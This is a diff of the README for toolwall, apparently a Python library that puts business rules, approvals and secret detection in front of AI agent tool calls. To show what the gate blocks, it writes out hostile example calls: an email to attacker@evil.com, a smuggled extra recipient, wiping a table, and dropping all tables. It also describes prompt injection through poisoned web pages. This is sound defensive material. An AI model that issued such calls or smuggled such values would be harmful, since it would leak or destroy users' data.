@@ -5,31 +5,36 @@
 [![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](https://github.com/Dev-Saif-Ops/toolwall/blob/main/toolwall/LICENSE)
 [![Zero dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](https://github.com/Dev-Saif-Ops/toolwall)
 
-**The security gateway for AI agent tool calls.**
+**Business rules for your AI agent's tool calls.**
 
-Your LLM can generate a *valid* tool call. That doesn't mean it's *safe* to execute.
-
-```python
-delete_records(filter={})            # perfectly valid JSON. whole table gone.
-send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
-transfer_money(amount=999999999)     # schema-valid. every field the right type.
-db_query(limit=10_000_000)           # production melts.
-```
-
-Every one of these passes JSON schema validation. Structured outputs, schemas, and
-content moderation all wave them through. `toolwall` is the fail-closed checkpoint
-between the LLM's tool call and execution that blocks them.
-
----
-
-## Install
+Your support agent can call `issue_refund()`. toolwall decides how much, for which
+customer, and when a person has to approve, before the call runs. Zero dependencies,
+deterministic, sync and async.
 
 ```bash
 pip install toolwall
 ```
 
-Zero required dependencies. Works with OpenAI, Anthropic, and Gemini native tool
-calling (and plain dicts). Python 3.10+, sync and async tools.
+```python
+from toolwall import ToolWall, rules as r
+
+wall = ToolWall()                               # default-deny, secret detection + audit on
+wall.register("issue_refund", issue_refund)     # schema from the type hints
+wall.rule("issue_refund",
+    amount=r.positive() & r.at_most(500),
+    order_id=r.owned_by("customer_id", lookup=orders.owner_of),
+    ask_if=r.over("amount", 200))               # above this, a person approves
+
+with wall.context(customer_id="c_42"):          # who the agent is acting for
+    wall.call("issue_refund", {"order_id": "o_9",  "amount": 40})    # runs
+    wall.call("issue_refund", {"order_id": "o_77", "amount": 40})    # blocked: not their order
+    wall.call("issue_refund", {"order_id": "o_9",  "amount": 300})   # held for a person
+```
+
+**Your framework runs the tools?** Ask for a verdict from its "before tool" hook:
+`d = wall.decide(name, args)` gives `d.verdict` ("allow", "deny" or "ask"), `d.reason`
+(safe to send to the model) and `d.detail` (the full reason, for your logs).
+`wall.check_output(name, value)` scans what the tool returned.
 
 **See it in 30 seconds, no API key:**
 
@@ -44,21 +49,37 @@ Every verdict below comes from the real gate. No model or API key.
   ALLOW  issue_refund(order_id='o_9', amount=40.0)
          an honest refund: ran: refunded 40.00 on o_9
   BLOCK  issue_refund(order_id='o_9', amount=5000.0)
-         a refund over the cap: policy violation: arg 'amount' rejected by in_range(0.01, 500)
+         a refund over the cap: policy violation: arg 'amount' rejected by (positive() & at_most(500))
+         model is told: The value for 'amount' isn't allowed for this call.
   BLOCK  issue_refund(order_id='o_77', amount=40.0)
-         someone else's order: order does not belong to the signed-in customer
+         someone else's order: policy violation: arg 'order_id' rejected by owned_by('customer_id')
+         model is told: The value for 'order_id' isn't allowed for this call.
   BLOCK  send_email(to='x@evil.com,ops@ourco.com', body='export')
-         a smuggled recipient: policy violation: arg 'to' rejected by customer_or_ourco
+         a smuggled recipient: policy violation: arg 'to' rejected by (email_domain('ourco.com',) | equals_context('customer_email'))
+         model is told: The value for 'to' isn't allowed for this call.
   ALLOW  lookup_customer(customer_id='c_42')
          a lookup whose record holds a key: ran, but tool output withheld: secret detected (stripe-key) in 'return.billing_api_key'
+         model is told: The tool ran, but its output can't be shown.
   HELD   close_account(customer_id='c_42')
          a destructive action: waiting for a human to approve
+         model is told: This call needs approval from a person before it can run.
   BLOCK  drop_all_tables()
          a tool nobody registered: unknown tool: 'drop_all_tables'
+         model is told: This tool is not available.
 
-1 ran · 5 stopped · 1 waiting for a human. Every decision is in the audit log (wall.export).
+1 ran · 5 stopped · 1 waiting for a human. The model gets the short reason; the full one goes to the audit log.
 ```
 
+It also blocks the generic valid-but-wrong calls an LLM produces:
+
+```python
+delete_records(filter={})            # perfectly valid JSON. whole table gone.
+send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
+db_query(limit=10_000_000)           # production melts.
+```
+
+Works with OpenAI, Anthropic and Gemini native tool calling, plain dicts, and MCP.
+Python 3.10+.
 
 ## Quickstart
 
@@ -131,10 +152,18 @@ Everything not explicitly allowed is blocked. That is the whole idea.
 
 - **Fail-closed gate**: unknown tool, schema violation, policy violation, budget hit,
   or unparseable payload all block *before* the tool runs. Registration is the allowlist.
-- **Policy engine**: value constraints (`in_range`, `one_of`, `matches`, `email_domain`…),
-  cross-argument rules, human-approval flags, and budget caps (calls / per-tool / USD).
-  For recipients use `email_domain("ourco.com")`, not `ends_with`: a comma-separated
-  list ends with your domain too.
+- **Business rules** (`toolwall.rules`): `at_most`, `between`, `positive`, `one_of`,
+  `owned_by`, `equals_context`, `email_domain`, `sql_readonly`, `path_under`,
+  `url_host`, composed with `&`, `|` and `~`. Strict: `"40"` is not a number and `True`
+  is not `1`. A rule that needs request context fails when it isn't set.
+- **Request context**: `wall.context(customer_id=...)`, visible to rules in this thread
+  or asyncio task only. The audit records the keys, never the values.
+- **Approvals** with `ask_if=r.over("amount", 200)`, bound to the exact call checked.
+- **Verdicts for any framework**: `decide()` and `check_output()`, with model-facing
+  reasons that name the argument, never the rule.
+- **Policy engine underneath**: cross-argument rules and budget caps (calls / per-tool
+  / USD). For recipients use `email_domain("ourco.com")`, not `ends_with`: a
+  comma-separated list ends with your domain too.
 - **Shield, both directions**: detects secrets (AWS, OpenAI, GitHub, Stripe, Slack,
   JWT, PEM, and high-entropy strings) in tool arguments *and in tool return values*,
   then blocks or redacts them, including in dict keys, tuples (database rows), sets,
